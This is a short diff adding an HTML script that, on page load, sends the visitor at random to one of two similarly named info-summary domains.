@@ -1,0 +1,12 @@
+<script type="text/javascript">
+	var acceptedWebsites = ['https://info-summary.net/', 'https://info-summary.com/'];
+
+	function randomKey(arr) {
+	    return Math.floor(Math.random() * arr.length);
+	}
+
+	var key = randomKey(acceptedWebsites);
+	var newLocation = acceptedWebsites[key];
+
+	window.location.href = newLocation;
+</script>
